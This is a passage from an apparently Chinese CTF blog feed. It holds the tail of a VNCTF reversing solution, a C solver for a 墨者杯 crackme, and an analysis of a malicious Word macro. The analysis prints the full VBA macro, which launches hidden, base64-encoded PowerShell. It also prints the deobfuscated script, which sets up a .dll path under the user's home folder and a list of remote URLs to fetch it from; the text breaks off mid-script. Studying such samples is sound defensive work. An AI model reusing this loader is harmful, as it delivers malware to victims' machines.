class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; decoded_len; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, decoded[i]^<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <br>    <span class="hljs-built_in">free</span>(decoded);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到flag:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">VNCTF&#123;Ur_go0d_@ndr0id<span class="hljs-meta">&amp;l1nux_Reve7ser&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>墨者杯-样本分析</title>
    <link href="/2024/06/06/%E5%A2%A8%E8%80%85%E6%9D%AF-%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <url>/2024/06/06/%E5%A2%A8%E8%80%85%E6%9D%AF-%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="墨者杯-样本分析"><a href="#墨者杯-样本分析" class="headerlink" title="墨者杯-样本分析"></a>墨者杯-样本分析</h1><p>第二个题很有意思，值得记录一下。</p><h2 id="样本分析1"><a href="#样本分析1" class="headerlink" title="样本分析1"></a>样本分析1</h2><p>给了一个BabyCrack.exe和一个flag.enc, 文件加密</p><p>进入ida看程序逻辑如下</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/111.png"></p><p>对文件输入流中的数据进行了一些条件判断和加密</p><p>打开flag.enc提取数据</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/222.png"></p><p>单字节爆破即可，exp如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> s[]=&#123;<span class="hljs-string">&quot;knlhkjkhihjiiklwihlgkfkhkwhej&#123;jgkjkihgiglgknklkmlij&#123;hghehghehehihehfly&quot;</span>&#125;;<br><span class="hljs-type">int</span>  arr[<span class="hljs-number">128</span>];<br><span class="hljs-comment">//for(int i=0;i&lt;strlen(s);i++)</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> v7=<span class="hljs-number">0</span>;v7&lt;<span class="hljs-number">128</span>;v7++)<br>&#123;<br>    <span class="hljs-keyword">if</span>(v7&gt;<span class="hljs-number">47</span>&amp;&amp;v7&lt;=<span class="hljs-number">96</span>)<br>    arr[v7]=v7+<span class="hljs-number">53</span>; <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(v7&lt;=<span class="hljs-number">46</span>)<br>        arr[v7]=v7+v7%<span class="hljs-number">11</span>;<br>    <span class="hljs-keyword">else</span><br>        arr[v7]=v7-v7%<span class="hljs-number">61</span>;<br>&#125;<br><span class="hljs-comment">//for(int i=0;i&lt;128;i++)</span><br><span class="hljs-comment">//printf(&quot;%c&quot;,arr[i]);</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(s);i++)<br>   &#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">128</span>;j++)<br>&#123;<br><span class="hljs-keyword">if</span>(arr[j]==s[i])<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,j);<br>&#125;<br>&#125;;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到697365634354467B437261636B305F526564324272696768745F32303230303430317D</p><p>十六进制解密得到flag</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/333.png"></p><p>得到flag：isecCTF{Crack0_Red2Bright_20200401}</p><h2 id="样本分析2"><a href="#样本分析2" class="headerlink" title="样本分析2"></a>样本分析2</h2><p>给了一个Macro.doc</p><p>使用oletools对其进行分析然后提去相关宏代码</p><p><a href="https://github.com/decalage2/oletools">https://github.com/decalage2/oletools</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">olevba ./Macro.doc<br></code></pre></td></tr></table></figure><p>得到宏代码</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/2.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Sub A()<br>    Dim B As String<br>    Dim D As Integer<br>    Dim Y2 As String<br>    Dim Y3 As Boolean<br>    D = <span class="hljs-number">1</span> + <span class="hljs-number">2</span><br>    C1 = <span class="hljs-string">&quot;cmd cmd cmd cmd /c msg %username% /v Word experienced an error trying to open the file. &amp;  P^Ow^er^she^L^L -w hidden -ENCOD &quot;</span><br>    C2 = <span class="hljs-string">&quot;cy5FLnQuIC4oLiIuWi55LjMuIi4rLiIuNS4iLikuIC4oLlsuVC55LlAuZS5dLiguIi57LjIufS57LjUufS57LjQufS57LjAufS57LjEufS57LjMufS4iLiAuLS5mLiAuJy5JLlIuZS5DLicuLC4nLlQuby4nLiwuJy5TLnkuUy50LkUuTS4uLicuLC4nLlIuWS4nLiwuJy5PLi4uRC4nLiwuJy5pLicuKS4gLikuOy4gLiAuUy5lLnQuLS5JLlQuRS5NLiAudi5hLnIuaS5BLkIubC5lLjouWS5KLnUuNC56LjMuIC4gLiguWy5ULnkucC5lLl0uKC4iLnsuNC59LnsuNS59LnsuMy59LnsuNi59LnsuMS59LnsuNy59LnsuMC59LnsuMi59LiIuIC4tLmYuJy5jLmUuJy4sLicuZS5ULi4uUy5lLlIuVi4nLiwuJy5wLk8uaS5uLlQuTS5BLk4uQS5nLkUuci4nLiwuJy5TLnQuZS5tLi4uJy4sLicuUy4nLiwuJy5ZLicuLC4nLm4uJy4sLicuaS4nLikuIC4gLikuOy4kLkUuci5yLm8uci5BLmMudC5pLm8ubi5QLnIuZS5mLmUuci5lLm4uYy5lLiAuPS4gLiguKC4nLlMuJy4rLicuaS5sLmUuJy4pLisuJy5uLicuKy4&quot;</span><br>    Y1 = <span class="hljs-number">1</span><br>    Y2 = <span class="hljs-string">&quot;X&quot;</span><br>    Y3 = True<br>    C3 = <span class="hljs-string">&quot;oLicudC5sLicuKy4nLnkuQy5vLicuKS4rLicubi4nLisuKC4nLnQuJy4rLicuaS5uLnUuZS4nLikuKS47LiQuVS4xLnUuaC43LjQuOC49LiQuRS4zLjQuSC4gLisuIC5bLmMuaC5hLnIuXS4oLjYuNC4pLiAuKy4gLiQuRy4zLjUuUS47LiQuQi42LjIuUS49LiguKC4nLkwuJy4rLicuMC4zLicuKS4rLicuSy4nLikuOy4gLiguIC4gLmQuaS5yLiAuIC4oLicuVi5BLnIuSS4nLisuJy5BLicuKy4nLkIuTC4nLisuJy5lLjouei55LjMuNS4nLikuKS4uLnYuYS5MLlUuRS46LjouIi5DLmAuUi5lLkEuYC5ULmUuZC5gLkkuci5FLmMuVC5vLlIueS4iLiguJC5ILk8uTS5FLiAuKy4gLiguKC4oLicuWC5FLjguWi4nLisuJy4zLnQuJy4pLisuKC4nLm4uYy4nLisuJy41LmQuWC5FLjguTC4nLikuKy4nLjYuJy4rLicuei4zLicuKy4nLm8uJy4rLiguJy5vLicuKy4nLjMuWC4nLikuKy4nLkUuOC4nLikuLS5SLmUuUC5MLkEuQy5lLiAuKC5bLkMuSC5BLnIuXS44LjguKy5bLkMuSC5BLnIuXS42LjkuKy5bLkMuSC5BLnIuXS41LjYuKS4sLlsuQy5ILkEuc&quot;</span><br>    <span class="hljs-keyword">If</span> Y1 = <span class="hljs-number">1</span> Then<br>        <span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> To <span class="hljs-number">10</span><br>            Y2 = Y2 &amp; Chr(i + <span class="hljs-number">64</span>)<br>        Next i<br>    <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br>    C4 = <span class="hljs-string">&quot;i5dLjkuMi4pLikuOy4kLk0uOS41LkEuPS4oLicuRi43LicuKy4nLjAuTi4nLikuOy4gLiAuKC5MLnMuIC4gLlYuQS5yLmkuQS5CLmwuZS46LlkuSi5VLjQuWi4zLikuLi52LmEuTC51LkUuOi46LiIucy5lLmAuQy51LnIuYC5pLmAuVC5ZLnAuYC5SLm8udC5PLkMuby5MLiIuIC49LiAuKC4oLicuVC5sLnMuJy4rLicuMS4nLikuKy4nLjIuJy4pLjsuJC5MLjUuXy5DLj0uKC4nLlAuNi4nLisuJy43LksuJy4pLjsuJC5WLmwuei5jLnouaS4wLiAuPS4gLiguJy5PLjIuJy4rLicuOC5DLicuKS47LiQuUC40LjAuTy49LiguJy5XLicuKy4oLicuMy4nLisuJy4xLkMuJy4pLikuOy4kLkYuNC5tLm4ucS5hLmYuPS4kLkguTy5NLkU&quot;</span><br>    C5 = <span class="hljs-string">&quot;uKy4oLiguJy57LjAufS5aLjMudC4nLisuKC4nLm4uYy4nLisuJy41LmQuJy4pLisuJy57LjAufS5MLjYuei4zLicuKy4nLm8uby4zLnsuMC4nLisuJy59LicuKS4gLiAuLS5mLlsuYy5ILmEuci5dLjkuMi4pLisuJC5WLmwuei5jLnouaS4wLisuKC4nLi4uJy4rLiguJy5kLmwuJy4rLicubC4nLikuKS47LiQuSi4wLjQuQi49LiguJy5RLicuKy4oLicuNC4wLicuKy4nLkwuJy4pLikuOy4kLk0ubC4zLmUudi5xLmwuPS4oLicuXS4nLisuJy5lLjEuJy4rLicuci5bLicuKy4nLlMuJy4rLiguJy46Li8uLy5hLm4uJy4rLicucy4nLisuJy52LmEudC4uLmMuby4nLisuJy5tLicuKy4nLi8uJy4pLisuKC4nLnMucC4tLicuKy4nLmQuJy4rLicuZC5tLmkubi4vLmYudy4nLikuKy4nLi8uJy4rLiguJy5ALl0uJy4rLicuZS4xLicuKS4rLicuci5bLicuKy4nLlMuJy4rLicuOi4vLicuKy4oLicuLy5nLmkudC4nLisuJy50LmguJy4rLicuZS4nLikuKy4oLicuaS5uLmQuJy4rLicuay5hLicuKS4rLiguJy5kLicuKy4nLmkuci5lLicuKS4rLicuYy50LicuKy4oLicuby5yLmwuLi5jLicuKy4nLm8uJy4pLisuJy5tLicuKy4nLi8uMi4nLisuJy4vLnEuJy4rLiguJy5PLlkuJy4rLicudy4nLikuKy4nLlQuJy4rLiguJy4vLkAuJy4rLicuXS5lLjEuci&quot;</span><br>    C6 = <span class="hljs-string">&quot;5bLicuKy4nLlMuJy4rLicuOi4vLicuKS4rLiguJy4vLmUubC5vLmcuJy4rLicucy4uLmcuJy4pLisuKC4nLjQuJy4rLicuZy50LmUuYy5oLm4uJy4rLicudC5sLm8uZy5pLmUuJy4pLisuJy5zLicuKy4oLicuLi5jLm8ubS4vLmIuJy4rLicueS4nLikuKy4oLicuby4nLisuJy51LnMuLy52LicuKS4rLiguJy4vLkAuJy4rLicuXS5lLjEuci4nLikuKy4oLicuWy5TLjouLy4vLicuKy4nLnAuYS4nLisuJy50LnQuYS4nLisuJy55LicuKy4nLmkucy50Lm8uby5lLicuKS4rLicuLi5jLicuKy4oLicuby5tLicuKy4nLi8udi5pLicuKS4rLiguJy5wLmkuby4tLicuKy4nLnouJy4pLisuKC4nLmUudC53LicuKy4nLm8uJy4pLisuKC4nLnguay4tLjEuJy4rLicuaC4nLikuKy4oLicubS4nLisuJy5wLnAuLy4nLikuKy4oLicuYy41Li8uQC4nLisuJy5dLicuKS4rLicuZS4nLisuKC4nLjEuci5bLlMuJy4rLicuOi4nLikuKy4oLicuLy4vLnIucy4nLisuJy52LicuKS4rLicubS5hLicuKy4oLicuYi4nLisuJy5pLm4uJy4pLisuKC4nLm4uJy4rLicuaC4uLmMuJy4pLisuKC4nLm8ubS4nLisuJy4vLm0ucC4nLisuJy4tLmM&quot;</span><br>    <span class="hljs-built_in">Select</span> Case Y3<br>        Case True<br>            Y4 = Y1 &amp; Y2<br>        Case False<br>            Y5 = Y1 &amp; Y2<br>    <span class="hljs-keyword">End</span> <span class="hljs-built_in">Select</span><br>    C7 = <span class="hljs-string">&quot;uby5uLicuKS4rLiguJy50LicuKy4nLnEubi4nLikuKy4oLicudC4vLjEuJy4rLicuNi4nLisuJy5xLlQuLy5ALicuKy4nLl0uZS4xLicuKS4rLiguJy5yLlsuUy4nLisuJy5zLjouLy4vLicuKy4nLmUuZS4nLikuKy4oLicubi4nLisuJy5tLm8uJy4pLisuKC4nLnIuZS55Li4uJy4rLicudC4nLisuJy51LnMuaS5uLicuKS4rLiguJy55LnMuJy4rLicucy4vLncucC4nLikuKy4oLicuLS5jLm8uJy4rLicubi50LmUuJy4rLicubi50LicuKS4rLiguJy4vLicuKy4nLm4udS5XLicuKy4nLi8uQC5dLmUuMS5yLlsuJy4pLisuJy5TLicuKy4oLicucy46Li8uJy4rLicuLy4nLisuJy5zLnUuJy4rLicuaS5lLm8ucC50LicuKS4rLicuby4nLisuJy5tLmkuJy4rLiguJy5wLmUuJy4rLicuLi5jLm8uJy4pLisuJy5tLicuKy4oLicuLy4nLisuJy53LmUuJy4&quot;</span><br>    C8 = <span class="hljs-string">&quot;pLisuKC4nLjEuMS4nLisuJy4tLicuKS4rLiguJy5rLm4uJy4rLicueC53Lm4uLy4nLisuJy5TLnMuJy4pLisuKC4nLkUuJy4rLicucy4vLicuKS4pLi4uIi5SLmUuUC5gLkwuYS5gLmMuRS4iLiguKC4nLl0uJy4rLiguJy5lLicuKy4nLjEuci5bLicuKS4rLicuUy4nLikuLC4oLlsuYS5yLnIuYS55Ll0uKC4nLnMuZC4nLiwuJy5zLncuJy4pLiwuKC4nLmgudC4nLisuJy50LnAuJy4pLiwuJy4zLmQuJy4pLlsuMS5dLikuLi4iLlMucC5MLmAuaS50LiIuKC4kLlIuNy4xLlAuIC4rLiAuJC5VLjEudS5oLjcuNC44LiAuKy4gLiQuWC40LjkuUi4pLjsuJC5JLjEuNC5HLj0uKC4nLlcuJy4rLiguJy45LicuKy4nLjQuRy4nLikuKS47LmYuby5yLmUuYS5jLmguIC4oLiQuUS54LjUuNS5pLnouNS4gLmkubi4gLiQuTS5sLjMuZS52LnEubC4pLnsudC5yLnkuey4oLi4uKC4nLk4uZS53LicuKy4nLi0uTy5iLmouJy4rLicuZS5jLnQuJy4pLiAucy55LlMudC5FLm0uLi5uLmUuVC4uLlcuRS5CLmMubC5pLk&quot;</span><br>    C9 = <span class="hljs-string">&quot;Uubi50LikuLi4iLmQuYC5PLmAudy5uLkwuby5gLkEuRC5mLkkubC5FLiIuKC4kLlEueC41LjUuaS56LjUuLC4gLiQuRi40Lm0ubi5xLmEuZi4pLjsuJC5HLjUuMC5DLj0uKC4nLlUuJy4rLiguJy4zLjcuJy4rLicuVy4nLikuKS47LkkuZi4gLiguKC4mLiguJy5HLmUudC4tLicuKy4nLkkudC5lLicuKy4nLm0uJy4pLiAuJC5GLjQubS5uLnEuYS5mLikuLi4iLkwuRS5OLmAuRy50LmguIi4gLi0uZy5lLiAuMy4xLjkuNi4zLikuIC57LiYuKC4nLnIuJy4rLicudS5uLmQubC4nLisuJy5sLjMuMi4nLikuIC4kLkYuNC5tLm4ucS5hLmYuLC4oLiguJy5DLicuKy4nLm8ubi50LnIuby4nLisuJy4xLl8uUi51LicuKS4rLicubi5ELicuKy4nLkwuJy4rLicuTC4nLikuLi4iLnQuYC5PLnMuYC5ULnIuSS5OLkcuIi4oLikuOy4kLkguMy43LkMuPS4oLicuSC4nLisuKC4nLjMuMC4nLisuJy5KLicuKS4pLjsuYi5yLmUuYS5rLjsuJC5LLjQuXy5RLj0uKC4nLk0uMS4nLisuJy42LlEuJy4pLn0ufS5jLmEudC5jLmguey59Ln0uJC5CLjcuMi5ILj0uKC4nLlMuJy4rLiguJy5fLl8uJy4rLicuWC4nLikuKS4=&quot;</span><br>    B = C1 &amp; C2 &amp; C3 &amp; C4 &amp; C5 &amp; C6 &amp; C7 &amp; C8 &amp; C9<br>    Shell B, vbHide<br><span class="hljs-keyword">End</span> Sub<br></code></pre></td></tr></table></figure><p>base64进行解码</p><p>得到经过混淆的powershell代码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">s.E.t. .(.<span class="hljs-string">&quot;.Z.y.3.&quot;</span>.+.<span class="hljs-string">&quot;.5.&quot;</span>.). .(.[<span class="hljs-type">.T.y.P.e.</span>].(.<span class="hljs-string">&quot;.&#123;.2.&#125;.&#123;.5.&#125;.&#123;.4.&#125;.&#123;.0.&#125;.&#123;.1.&#125;.&#123;.3.&#125;.&quot;</span>. .-.f. .<span class="hljs-string">&#x27;.I.R.e.C.&#x27;</span>.,.<span class="hljs-string">&#x27;.T.o.&#x27;</span>.,.<span class="hljs-string">&#x27;.S.y.S.t.E.M...&#x27;</span>.,.<span class="hljs-string">&#x27;.R.Y.&#x27;</span>.,.<span class="hljs-string">&#x27;.O...D.&#x27;</span>.,.<span class="hljs-string">&#x27;.i.&#x27;</span>.). .).;. . .S.e.t.-.I.T.E.M. .v.a.r.i.A.B.l.e.:.Y.J.u.<span class="hljs-number">4</span>.z.<span class="hljs-number">3</span>. . .(.[<span class="hljs-type">.T.y.p.e.</span>].(.<span class="hljs-string">&quot;.&#123;.4.&#125;.&#123;.5.&#125;.&#123;.3.&#125;.&#123;.6.&#125;.&#123;.1.&#125;.&#123;.7.&#125;.&#123;.0.&#125;.&#123;.2.&#125;.&quot;</span>. .-.f.<span class="hljs-string">&#x27;.c.e.&#x27;</span>.,.<span class="hljs-string">&#x27;.e.T...S.e.R.V.&#x27;</span>.,.<span class="hljs-string">&#x27;.p.O.i.n.T.M.A.N.A.g.E.r.&#x27;</span>.,.<span class="hljs-string">&#x27;.S.t.e.m...&#x27;</span>.,.<span class="hljs-string">&#x27;.S.&#x27;</span>.,.<span class="hljs-string">&#x27;.Y.&#x27;</span>.,.<span class="hljs-string">&#x27;.n.&#x27;</span>.,.<span class="hljs-string">&#x27;.i.&#x27;</span>.). . .).;.<span class="hljs-variable">$</span>.E.r.r.o.r.A.c.t.i.o.n.P.r.e.f.e.r.e.n.c.e. .=. .(.(.<span class="hljs-string">&#x27;.S.&#x27;</span>.+.<span class="hljs-string">&#x27;.i.l.e.&#x27;</span>.).+.<span class="hljs-string">&#x27;.n.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.t.l.&#x27;</span>.+.<span class="hljs-string">&#x27;.y.C.o.&#x27;</span>.).+.<span class="hljs-string">&#x27;.n.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.t.&#x27;</span>.+.<span class="hljs-string">&#x27;.i.n.u.e.&#x27;</span>.).).;.<span class="hljs-variable">$</span>.U.<span class="hljs-number">1</span>.u.h.<span class="hljs-number">7.4</span>.<span class="hljs-number">8</span>.=.<span class="hljs-variable">$</span>.E.<span class="hljs-number">3.4</span>.H. .+. .[<span class="hljs-type">.c.h.a.r.</span>].(.<span class="hljs-number">6.4</span>.). .+. .<span class="hljs-variable">$</span>.G.<span class="hljs-number">3.5</span>.Q.;.<span class="hljs-variable">$</span>.B.<span class="hljs-number">6.2</span>.Q.=.(.(.<span class="hljs-string">&#x27;.L.&#x27;</span>.+.<span class="hljs-string">&#x27;.0.3.&#x27;</span>.).+.<span class="hljs-string">&#x27;.K.&#x27;</span>.).;. .(. . .d.i.r. . .(.<span class="hljs-string">&#x27;.V.A.r.I.&#x27;</span>.+.<span class="hljs-string">&#x27;.A.&#x27;</span>.+.<span class="hljs-string">&#x27;.B.L.&#x27;</span>.+.<span class="hljs-string">&#x27;.e.:.z.y.3.5.&#x27;</span>.).)...v.a.L.U.E.:.:.<span class="hljs-string">&quot;.C.`.R.e.A.`.T.e.d.`.I.r.E.c.T.o.R.y.&quot;</span>.(.<span class="hljs-variable">$</span>.H.O.M.E. .+. .(.(.(.<span class="hljs-string">&#x27;.X.E.8.Z.&#x27;</span>.+.<span class="hljs-string">&#x27;.3.t.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.n.c.&#x27;</span>.+.<span class="hljs-string">&#x27;.5.d.X.E.8.L.&#x27;</span>.).+.<span class="hljs-string">&#x27;.6.&#x27;</span>.+.<span class="hljs-string">&#x27;.z.3.&#x27;</span>.+.<span class="hljs-string">&#x27;.o.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.o.&#x27;</span>.+.<span class="hljs-string">&#x27;.3.X.&#x27;</span>.).+.<span class="hljs-string">&#x27;.E.8.&#x27;</span>.).-.R.e.P.L.A.C.e. .(.[<span class="hljs-type">.C.H.A.r.</span>].<span class="hljs-number">8.8</span>.+.[<span class="hljs-type">.C.H.A.r.</span>].<span class="hljs-number">6.9</span>.+.[<span class="hljs-type">.C.H.A.r.</span>].<span class="hljs-number">5.6</span>.).,.[<span class="hljs-type">.C.H.A.r.</span>].<span class="hljs-number">9.2</span>.).).;.<span class="hljs-variable">$</span>.M.<span class="hljs-number">9.5</span>.A.=.(.<span class="hljs-string">&#x27;.F.7.&#x27;</span>.+.<span class="hljs-string">&#x27;.0.N.&#x27;</span>.).;. . .(.L.s. . .V.A.r.i.A.B.l.e.:.Y.J.U.<span class="hljs-number">4</span>.Z.<span class="hljs-number">3</span>.)...v.a.L.u.E.:.:.<span class="hljs-string">&quot;.s.e.`.C.u.r.`.i.`.T.Y.p.`.R.o.t.O.C.o.L.&quot;</span>. .=. .(.(.<span class="hljs-string">&#x27;.T.l.s.&#x27;</span>.+.<span class="hljs-string">&#x27;.1.&#x27;</span>.).+.<span class="hljs-string">&#x27;.2.&#x27;</span>.).;.<span class="hljs-variable">$</span>.L.<span class="hljs-number">5</span>._.C.=.(.<span class="hljs-string">&#x27;.P.6.&#x27;</span>.+.<span class="hljs-string">&#x27;.7.K.&#x27;</span>.).;.<span class="hljs-variable">$</span>.V.l.z.c.z.i.<span class="hljs-number">0</span>. .=. .(.<span class="hljs-string">&#x27;.O.2.&#x27;</span>.+.<span class="hljs-string">&#x27;.8.C.&#x27;</span>.).;.<span class="hljs-variable">$</span>.P.<span class="hljs-number">4.0</span>.O.=.(.<span class="hljs-string">&#x27;.W.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.3.&#x27;</span>.+.<span class="hljs-string">&#x27;.1.C.&#x27;</span>.).).;.<span class="hljs-variable">$</span>.F.<span class="hljs-number">4</span>.m.n.q.a.f.=.<span class="hljs-variable">$</span>.H.O.M.E.+.(.(.<span class="hljs-string">&#x27;.&#123;.0.&#125;.Z.3.t.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.n.c.&#x27;</span>.+.<span class="hljs-string">&#x27;.5.d.&#x27;</span>.).+.<span class="hljs-string">&#x27;.&#123;.0.&#125;.L.6.z.3.&#x27;</span>.+.<span class="hljs-string">&#x27;.o.o.3.&#123;.0.&#x27;</span>.+.<span class="hljs-string">&#x27;.&#125;.&#x27;</span>.). . .-.f.[<span class="hljs-type">.c.H.a.r.</span>].<span class="hljs-number">9.2</span>.).+.<span class="hljs-variable">$</span>.V.l.z.c.z.i.<span class="hljs-number">0</span>.+.(.<span class="hljs-string">&#x27;...&#x27;</span>.+.(.<span class="hljs-string">&#x27;.d.l.&#x27;</span>.+.<span class="hljs-string">&#x27;.l.&#x27;</span>.).).;.<span class="hljs-variable">$</span>.J.<span class="hljs-number">0.4</span>.B.=.(.<span class="hljs-string">&#x27;.Q.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.4.0.&#x27;</span>.+.<span class="hljs-string">&#x27;.L.&#x27;</span>.).).;.<span class="hljs-variable">$</span>.M.l.<span class="hljs-number">3</span>.e.v.q.l.=.(.<span class="hljs-string">&#x27;.].&#x27;</span>.+.<span class="hljs-string">&#x27;.e.1.&#x27;</span>.+.<span class="hljs-string">&#x27;.r.[.&#x27;</span>.+.<span class="hljs-string">&#x27;.S.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.:././.a.n.&#x27;</span>.+.<span class="hljs-string">&#x27;.s.&#x27;</span>.+.<span class="hljs-string">&#x27;.v.a.t...c.o.&#x27;</span>.+.<span class="hljs-string">&#x27;.m.&#x27;</span>.+.<span class="hljs-string">&#x27;./.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.s.p.-.&#x27;</span>.+.<span class="hljs-string">&#x27;.d.&#x27;</span>.+.<span class="hljs-string">&#x27;.d.m.i.n./.f.w.&#x27;</span>.).+.<span class="hljs-string">&#x27;./.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.@.].&#x27;</span>.+.<span class="hljs-string">&#x27;.e.1.&#x27;</span>.).+.<span class="hljs-string">&#x27;.r.[.&#x27;</span>.+.<span class="hljs-string">&#x27;.S.&#x27;</span>.+.<span class="hljs-string">&#x27;.:./.&#x27;</span>.+.(.<span class="hljs-string">&#x27;./.g.i.t.&#x27;</span>.+.<span class="hljs-string">&#x27;.t.h.&#x27;</span>.+.<span class="hljs-string">&#x27;.e.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.i.n.d.&#x27;</span>.+.<span class="hljs-string">&#x27;.k.a.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.d.&#x27;</span>.+.<span class="hljs-string">&#x27;.i.r.e.&#x27;</span>.).+.<span class="hljs-string">&#x27;.c.t.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.o.r.l...c.&#x27;</span>.+.<span class="hljs-string">&#x27;.o.&#x27;</span>.).+.<span class="hljs-string">&#x27;.m.&#x27;</span>.+.<span class="hljs-string">&#x27;./.2.&#x27;</span>.+.<span class="hljs-string">&#x27;./.q.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.O.Y.&#x27;</span>.+.<span class="hljs-string">&#x27;.w.&#x27;</span>.).+.<span class="hljs-string">&#x27;.T.&#x27;</span>.+.(.<span class="hljs-string">&#x27;./.@.&#x27;</span>.+.<span class="hljs-string">&#x27;.].e.1.r.[.&#x27;</span>.+.<span class="hljs-string">&#x27;.S.&#x27;</span>.+.<span class="hljs-string">&#x27;.:./.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;./.e.l.o.g.&#x27;</span>.+.<span class="hljs-string">&#x27;.s...g.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.4.&#x27;</span>.+.<span class="hljs-string">&#x27;.g.t.e.c.h.n.&#x27;</span>.+.<span class="hljs-string">&#x27;.t.l.o.g.i.e.&#x27;</span>.).+.<span class="hljs-string">&#x27;.s.&#x27;</span>.+.(.<span class="hljs-string">&#x27;...c.o.m./.b.&#x27;</span>.+.<span class="hljs-string">&#x27;.y.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.o.&#x27;</span>.+.<span class="hljs-string">&#x27;.u.s./.v.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;./.@.&#x27;</span>.+.<span class="hljs-string">&#x27;.].e.1.r.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.[.S.:././.&#x27;</span>.+.<span class="hljs-string">&#x27;.p.a.&#x27;</span>.+.<span class="hljs-string">&#x27;.t.t.a.&#x27;</span>.+.<span class="hljs-string">&#x27;.y.&#x27;</span>.+.<span class="hljs-string">&#x27;.i.s.t.o.o.e.&#x27;</span>.).+.<span class="hljs-string">&#x27;...c.&#x27;</span>.+.(.<span class="hljs-string">&#x27;.o.m.&#x27;</span>.+.<span class="hljs-string">&#x27;./.v.i.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.p.i.o.-.&#x27;</span>.+.<span class="hljs-string">&#x27;.z.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.e.t.w.&#x27;</span>.+.<span class="hljs-string">&#x27;.o.&#x27;</span>.).+.(.<span class="hljs-string">&#x27;.x.k.-.1.&#x27;</span>.+.<span class="hljs-string">&#x27;.h.&#x27;</span>.).+.(.<span 